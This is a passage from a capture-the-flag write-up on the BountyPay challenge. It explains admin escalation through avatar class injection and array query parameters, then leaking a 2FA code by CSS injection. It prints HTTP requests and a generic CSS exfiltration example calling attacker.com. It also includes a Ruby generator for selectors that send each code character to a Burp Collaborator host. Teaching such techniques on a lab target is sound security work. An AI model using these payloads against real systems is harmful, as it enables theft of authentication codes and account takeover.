<p>Here I'm trying to inject the followin payload: <code>&lt;s&gt;sandra&lt;/s&gt;</code> but we can see that all special characters are filtered both on the profile page and on the tickets page.</p>
<p><img alt="" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-05%20at%2021.19.55.png" /></p>
<p>The request to change our avatar is working in a similar fashion. There are only three avatars available and when you switch the value <code>avartar1</code>, <code>avatar2</code> or <code>avatar3</code> is sent.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>http -f post &quot;https://staff.bountypay.h1ctf.com/?template=home&quot; \
<a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>Cookie:&#39;token=c0...&#39; \
<a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>profile_name=ssandras \
<a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>profile_avatar=avatar3
</code></pre></div>
<p>The value is then used to set a different background image for the div using CSS:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;col-md-12 text-center&quot;</span><span class="p">&gt;</span>
<a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;margin:auto&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;avatar avatar3&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="p">.</span><span class="nc">avatar1</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="w">    </span><span class="k">background-image</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;data:image/png;base64,iVB...=&quot;</span><span class="p">);</span>
<a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a><span class="p">}</span>
<a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>
<a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a><span class="p">.</span><span class="nc">avatar2</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a><span class="w">    </span><span class="k">background-image</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;data:image/png;base64,iVB...=&quot;</span><span class="p">);</span>
<a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a><span class="p">}</span>
<a id="__codelineno-62-8" name="__codelineno-62-8" href="#__codelineno-62-8"></a>
<a id="__codelineno-62-9" name="__codelineno-62-9" href="#__codelineno-62-9"></a><span class="p">.</span><span class="nc">avatar3</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-62-10" name="__codelineno-62-10" href="#__codelineno-62-10"></a><span class="w">    </span><span class="k">background-image</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;data:image/png;base64,iVB...=&quot;</span><span class="p">);</span>
<a id="__codelineno-62-11" name="__codelineno-62-11" href="#__codelineno-62-11"></a><span class="p">}</span>
</code></pre></div>
<p>Something interesting is that even though, like for our profile name special characters are stripped, we can still use this to set an arbitrary class (or multiple, the space character is allowed) on the div.</p>
<p>At first, it looks like that we might be able to set our avatar to <code>upgradeToAdmin</code> and if we can trick an admin into clicking our avatar then we will be admin but there are a couple of issues:</p>
<ul>
<li>We need to find a page where our avatar will be displayed (this cannot be the profile page since this will not be our avatar that is displayed)</li>
<li>We should get rid of the click requirements (since this is a CTF we cannot expect that a human will manually click on our avatar)</li>
<li>We need in input in the page with <code>username</code> as its name</li>
</ul>
<p>The first requirement is easy, the ticket page <code>?template=ticket&amp;ticket_id=3582</code> will display our avatar to anyone who clicks on it. The second one is doable since we can set the <code>tab3</code> class on the avatar as well as set it as a hash in the link we will send to the admin using the report url.</p>
<p>So far our avatar is set to  <code>tab3 upgradeToAdmin</code> and the link we need to report looks like this:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>/?template=ticket&amp;ticket_id=3582#tab3
</code></pre></div>
<p>At this point the third requirement looks impossible since the only place where there is an input with a name of <code>username</code> is the login page. The good news is that we can set the value of the field by passing the username as a get parameter.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>?template=login&amp;username=test
</code></pre></div>
<p>Great ! If only we could load both template at the same time... Maybe if we can send multiple values for the template param ?</p>
<p>The same way there is no concensus over how objects should be represented in query parameters, there is no standardized way to format arrays of values in query parameters. Here are some ways to do it:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>?foo=bar&amp;foo=qux
<a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>?foo[]=bar&amp;foo[]=qux
<a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>?foo=bar,qux
</code></pre></div>
<p>Luckily for us, repeating the parameter along with empty square brackets did the trick ! Our final payload looks like this:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>/?template[]=login&amp;template[]=ticket&amp;username=sandra.allison&amp;ticket_id=3582#tab3
</code></pre></div>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>If you try to use this URL and then use the report page feature this will not work. The hash part <code>#tab3</code> will not be sent. You will need to encode it manually.</p>
</div>
<p>When we submit it using the report page feature we get back an updated cookie which let us acces the admin tab revealing the credentials of Marten Mickos !</p>
<p><img alt="Admin" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-04%20at%2009.33.42.png" /></p>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>Something I have not mentioned is that for this part, every information (profile name and avatar) was actually stored in the cookie and there was no data persistance which might be confusing since this means that this attack could not work. Indeed the admin would have a different cookie without our information. Since everything was pointing in the same direction I tought this was probably simulated and that we could ignore it. This was later confirmed to me by <a href="https://twitter.com/adamtlangley">@adamtlangley</a> the creator of the challenge.</p>
</div>
<h2 id="you-will-pay-for-this">You will pay for this !<a class="headerlink" href="#you-will-pay-for-this" title="Permanent link">&para;</a></h2>
<p>Once we are logged in using Mårten Mickos credentials we can finally see some transactions to process for the month of may.</p>
<p><img alt="" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-04%20at%2009.52.31.png" /></p>
<p>Sadly clicking on pay does not show us the final flag but a new 2FA screen that cannot be as easily bypassed as the first one...</p>
<p><img alt="" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-04%20at%2009.52.59.png" /></p>
<p>Let's look at the request:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a><span class="nf">POST</span> <span class="nn">/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">app.bountypay.h1ctf.com</span>
<a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">73</span>
<a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a><span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
<a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a><span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a><span class="na">Origin</span><span class="o">:</span> <span class="l">https://app.bountypay.h1ctf.com</span>
<a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<a id="__codelineno-67-9" name="__codelineno-67-9" href="#__codelineno-67-9"></a><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36 autochrome/purple</span>
<a id="__codelineno-67-10" name="__codelineno-67-10" href="#__codelineno-67-10"></a><span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<a id="__codelineno-67-11" name="__codelineno-67-11" href="#__codelineno-67-11"></a><span class="na">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
<a id="__codelineno-67-12" name="__codelineno-67-12" href="#__codelineno-67-12"></a><span class="na">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
<a id="__codelineno-67-13" name="__codelineno-67-13" href="#__codelineno-67-13"></a><span class="na">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
<a id="__codelineno-67-14" name="__codelineno-67-14" href="#__codelineno-67-14"></a><span class="na">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
<a id="__codelineno-67-15" name="__codelineno-67-15" href="#__codelineno-67-15"></a><span class="na">Referer</span><span class="o">:</span> <span class="l">https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba</span>
<a id="__codelineno-67-16" name="__codelineno-67-16" href="#__codelineno-67-16"></a><span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<a id="__codelineno-67-17" name="__codelineno-67-17" href="#__codelineno-67-17"></a><span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-GB,en-US;q=0.9,en;q=0.8</span>
<a id="__codelineno-67-18" name="__codelineno-67-18" href="#__codelineno-67-18"></a><span class="na">Cookie</span><span class="o">:</span> <span class="l">token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9</span>
<a id="__codelineno-67-19" name="__codelineno-67-19" href="#__codelineno-67-19"></a>
<a id="__codelineno-67-20" name="__codelineno-67-20" href="#__codelineno-67-20"></a><span class="nt">app_style</span><span class="o">=</span><span class="s">https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css</span>
</code></pre></div>
<p>Something stands out here, there is an <code>app_style</code> parameter containing the URL of a CSS file: https://www.bountypay.h1ctf.com/css/uni_2fa_style.css</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="c">/**</span>
<a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a><span class="c">Template for the UNI 2FA App</span>
<a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a><span class="c"> */</span>
<a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a>
<a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a><span class="nt">body</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a><span class="w">    </span><span class="k">background-color</span><span class="p">:</span><span class="w"> </span><span class="mh">#FFFFFF</span><span class="p">;</span>
<a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a><span class="p">}</span>
<a id="__codelineno-68-8" name="__codelineno-68-8" href="#__codelineno-68-8"></a>
<a id="__codelineno-68-9" name="__codelineno-68-9" href="#__codelineno-68-9"></a><span class="nt">div</span><span class="p">.</span><span class="nc">branding</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-68-10" name="__codelineno-68-10" href="#__codelineno-68-10"></a><span class="w">    </span><span class="k">height</span><span class="p">:</span><span class="mi">80</span><span class="kt">px</span><span class="p">;</span>
<a id="__codelineno-68-11" name="__codelineno-68-11" href="#__codelineno-68-11"></a><span class="w">    </span><span class="k">width</span><span class="p">:</span><span class="mi">80</span><span class="kt">px</span><span class="p">;</span>
<a id="__codelineno-68-12" name="__codelineno-68-12" href="#__codelineno-68-12"></a><span class="w">    </span><span class="k">margin</span><span class="p">:</span><span class="mi">20</span><span class="kt">px</span><span class="w"> </span><span class="kc">auto</span><span class="w"> </span><span class="mi">40</span><span class="kt">px</span><span class="w"> </span><span class="kc">auto</span><span class="p">;</span>
<a id="__codelineno-68-13" name="__codelineno-68-13" href="#__codelineno-68-13"></a><span class="w">    </span><span class="k">background-image</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;https://www.bountypay.h1ctf.com/images/bountypay.png&quot;</span><span class="p">);</span>
<a id="__codelineno-68-14" name="__codelineno-68-14" href="#__codelineno-68-14"></a><span class="w">    </span><span class="k">background-position</span><span class="p">:</span><span class="kc">center</span><span class="w"> </span><span class="kc">center</span><span class="p">;</span>
<a id="__codelineno-68-15" name="__codelineno-68-15" href="#__codelineno-68-15"></a><span class="w">    </span><span class="k">background-repeat</span><span class="p">:</span><span class="w"> </span><span class="kc">no-repeat</span><span class="p">;</span>
<a id="__codelineno-68-16" name="__codelineno-68-16" href="#__codelineno-68-16"></a><span class="w">    </span><span class="k">background-size</span><span class="p">:</span><span class="w"> </span><span class="kc">cover</span><span class="p">;</span>
<a id="__codelineno-68-17" name="__codelineno-68-17" href="#__codelineno-68-17"></a><span class="p">}</span>
</code></pre></div>
<p>... and we only have 2 minutes to send the 2FA code.</p>
<p><img alt="" loading="lazy" src="../h12006-ctf-writeup/Screenshot%202020-06-04%20at%2009.53.26.png" /></p>
<p>In the response we can see that the max length of the 2FA is seven characters:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;challenge_answer&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&quot;7&quot;</span><span class="p">&gt;</span>
</code></pre></div>
<p>The idea here, while not really realist, is that the CSS file that is sent, is then included in the page that the 2FA app is using to generate the 2FA code. If this is true, this means that we will probably need to use a CSS injection attack to leak the 2FA code. We can confirm this by sending the request with an <code>app_style</code> that point to a server in our control. For this, I used <a href="https://portswigger.net/burp/documentation/collaborator">Burp Collaborator</a>:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="nf">POST</span> <span class="nn">/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">app.bountypay.h1ctf.com</span>
<a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">75</span>
<a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a><span class="na">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
<a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a><span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a><span class="na">Origin</span><span class="o">:</span> <span class="l">https://app.bountypay.h1ctf.com</span>
<a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
<a id="__codelineno-70-9" name="__codelineno-70-9" href="#__codelineno-70-9"></a><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36 autochrome/purple</span>
<a id="__codelineno-70-10" name="__codelineno-70-10" href="#__codelineno-70-10"></a><span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
<a id="__codelineno-70-11" name="__codelineno-70-11" href="#__codelineno-70-11"></a><span class="na">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">same-origin</span>
<a id="__codelineno-70-12" name="__codelineno-70-12" href="#__codelineno-70-12"></a><span class="na">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
<a id="__codelineno-70-13" name="__codelineno-70-13" href="#__codelineno-70-13"></a><span class="na">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
<a id="__codelineno-70-14" name="__codelineno-70-14" href="#__codelineno-70-14"></a><span class="na">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
<a id="__codelineno-70-15" name="__codelineno-70-15" href="#__codelineno-70-15"></a><span class="na">Referer</span><span class="o">:</span> <span class="l">https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba</span>
<a id="__codelineno-70-16" name="__codelineno-70-16" href="#__codelineno-70-16"></a><span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<a id="__codelineno-70-17" name="__codelineno-70-17" href="#__codelineno-70-17"></a><span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-GB,en-US;q=0.9,en;q=0.8</span>
<a id="__codelineno-70-18" name="__codelineno-70-18" href="#__codelineno-70-18"></a><span class="na">Cookie</span><span class="o">:</span> <span class="l">token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9</span>
<a id="__codelineno-70-19" name="__codelineno-70-19" href="#__codelineno-70-19"></a>
<a id="__codelineno-70-20" name="__codelineno-70-20" href="#__codelineno-70-20"></a><span class="nt">app_style</span><span class="o">=</span><span class="s">https%3A%2F%2F0stbry4if5vk4bspeq59bh6zoqugi5.burpcollaborator.net</span>
</code></pre></div>
<p>The request was received from IP address 3.21.98.146, the same IP used by all the applications.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">0stbry4if5vk4bspeq59bh6zoqugi5.burpcollaborator.net</span>
<a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
<a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36</span>
<a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a><span class="na">Accept</span><span class="o">:</span> <span class="l">text/css,*/*;q=0.1</span>
<a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a><span class="na">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">cross-site</span>
<a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a><span class="na">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">no-cors</span>
<a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a><span class="na">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">style</span>
<a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a><span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
<a id="__codelineno-71-10" name="__codelineno-71-10" href="#__codelineno-71-10"></a><span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US</span>
</code></pre></div>
<p>The User-Agent tells us that the browser used is <a href="https://developers.google.com/web/updates/2017/04/headless-chrome">HeadlessChrome</a> which is common in CTF. At this point, I had some idea on how to proceed since I knew you could <a href="https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d">exfiltrate data using CSS</a> but there was something I was missing.</p>
<p>The general CSS injection data exfiltration method is to use CSS like:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="c">/* https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d */</span>
<a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="nt">csrf</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="nt">a</span><span class="o">]</span><span class="p">{</span>
<a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a><span class="w">    </span><span class="k">background-image</span><span class="p">:</span><span class="w"> </span><span class="nb">url</span><span class="p">(</span><span class="sx">https://attacker.com/exfil/a</span><span class="p">);</span>
<a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a><span class="p">}</span>
<a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="nt">csrf</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="nt">b</span><span class="o">]</span><span class="p">{</span>
<a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a><span class="w">    </span><span class="k">background-image</span><span class="p">:</span><span class="w"> </span><span class="nb">url</span><span class="p">(</span><span class="sx">https://attacker.com/exfil/b</span><span class="p">);</span>
<a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a><span class="p">}</span>
<a id="__codelineno-72-8" name="__codelineno-72-8" href="#__codelineno-72-8"></a><span class="c">/* ... */</span>
<a id="__codelineno-72-9" name="__codelineno-72-9" href="#__codelineno-72-9"></a><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="nt">csrf</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="nt">9</span><span class="o">]</span><span class="p">{</span>
<a id="__codelineno-72-10" name="__codelineno-72-10" href="#__codelineno-72-10"></a><span class="w">    </span><span class="k">background-image</span><span class="p">:</span><span class="w"> </span><span class="nb">url</span><span class="p">(</span><span class="sx">https://attacker.com/exfil/9</span><span class="p">);</span><span class="w">   </span>
<a id="__codelineno-72-11" name="__codelineno-72-11" href="#__codelineno-72-11"></a><span class="p">}</span>
</code></pre></div>
<p>Then, <code>attacker.com</code> would load an iframe with this css injection on it on <code>target.com</code> . <code>attacker.com</code> would then wait for a request to <code>https://attacker.com/exfil/&lt;data&gt;</code>. The iframe trick is useful since we can guess one character at a time.</p>
<p>In our case, we cannot do this since there is no way to iframe the app. The thing is, bruteforcing a 7 character 2FA code is not doable if the alphabet is a-zA-Z0-9 since this represent 1,028,071,702,528 combinations.</p>
<p>After some <a href="https://gist.github.com/Techbrunch/82c3691e20a6c754a4f16e93d752cc3e/revisions">trials and errors</a> I realized that there are actually 7 inputs in the page, one for each character ! This makes the challenge way easier since this requires 364 (52*7) combinations only !&#x20;</p>
<p>I wrote a small Ruby script to generate all the combinations:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">7</span><span class="p">)</span><span class="o">.</span><span class="n">to_a</span><span class="o">.</span><span class="n">each</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="o">|</span><span class="n">ct</span><span class="o">|</span>
<a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a><span class="w">    </span><span class="p">((</span><span class="s1">&#39;a&#39;</span><span class="o">..</span><span class="s1">&#39;z&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">to_a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="o">..</span><span class="s1">&#39;9&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">to_a</span><span class="p">)</span><span class="o">.</span><span class="n">each</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="o">|</span><span class="n">char</span><span class="o">|</span>
<a id="__codelineno-73-3" name="__codelineno-73-3" href="#__codelineno-73-3"></a><span class="w">        </span><span class="nb">puts</span><span class="w"> </span><span class="s2">&quot;input:nth-child(</span><span class="si">#{</span><span class="n">ct</span><span class="si">}</span><span class="s2">)[value^=</span><span class="se">\&quot;</span><span class="si">#{</span><span class="n">char</span><span class="si">}</span><span class="se">\&quot;</span><span class="s2">] {background:url(</span><span class="se">\&quot;</span><span class="s2">http://</span><span class="si">#{</span><span class="n">ct</span><span class="si">}</span><span class="s2">-</span><span class="si">#{</span><span class="n">char</span><span class="si">}</span><span class="s2">.lwl3lz48tr50o2qlajeftgkff6lx9m.burpcollaborator.net</span><span class="se">\&quot;</span><span class="s2">);}&quot;</span>
<a id="__codelineno-73-4" name="__codelineno-73-4" href="#__codelineno-73-4"></a><span class="w">    </span><span class="k">end</span>
<a id="__codelineno-73-5" name="__codelineno-73-5" href="#__codelineno-73-5"></a>
<a id="__codelineno-73-6" name="__codelineno-73-6" href="#__codelineno-73-6"></a><span class="w">    </span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">..</span><span class="s1">&#39;Z&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">to_a</span><span class="o">.</span><span class="n">each</span><span class="w"> </span><span class="k">do</span><span class="w"> </span><span class="o">|</span><span class="n">char</span><span class="o">|</span>
<a id="__codelineno-73-7" name="__codelineno-73-7" href="#__codelineno-73-7"></a><span class="w">        </span><span class="nb">puts</span><span class="w"> </span><span class="s2">&quot;input:nth-child(</span><span class="si">#{</span><span class="n">ct</span><span class="si">}</span><span class="s2">)[value^=</span><span class="se">\&quot;</span><span class="si">#{</span><span class="n">char</span><span class="si">}</span><span class="se">\&quot;</span><span class="s2">] {background:url(</span><span class="se">\&quot;</span><span class="s2">http://</span><span class="si">#{</span><span class="n">ct</span><span class="si">}</span><span class="s2">-m</span><span class="si">#{</span><span class="n">char</span><span class="si">}</span><span class="s2">.lwl3lz48tr50o2qlajeftgkff6lx9m.burpcollaborator.net</span><span class="se">\&quot;</span><span class="s2">);}&quot;</span>
<a id="__codelineno-73-8" name="__codelineno-73-8" href="#__codelineno-73-8"></a><span class="w">    </span><span class="k">end</span>
<a id="__codelineno-73-9" name="__codelineno-73-9" href="#__codelineno-73-9"></a><span class="k">end</span>
</code></pre></div>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>We are using <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-child">nth-child()</a> to matches the inputs element based on their position since the first character should be the first input.</p>
</div>
<p>The output looks like this:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a><span class="nt">input</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">6</span><span class="o">)[</span><span class="nt">value</span><span class="o">^=</span><span class="s2">&quot;a&quot;</span><span class="o">]</span><span class="w"> </span><span class="p">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;http://1-a.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net&quot;</span><span class="p">);}</span>
<a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a><span class="c">/* ... */</span>
<a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a><span class="nt">input</span><span class="p">:</span><span class="nd">nth-child</span><span class="o">(</span><span class="nt">6</span><span class="o">)[</span><span class="nt">value</span><span class="o">^=</span><span class="s2">&quot;z&quot;</span><span class="o">]</span><span class="w"> </span><span class="p">{</span><span class="k">background</span><span class="p">:</span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;http://6-z.vkjkf8p495807buale52hbo3musmgb.burpcollaborator.net&quot;</span><span class="p">);}</span>
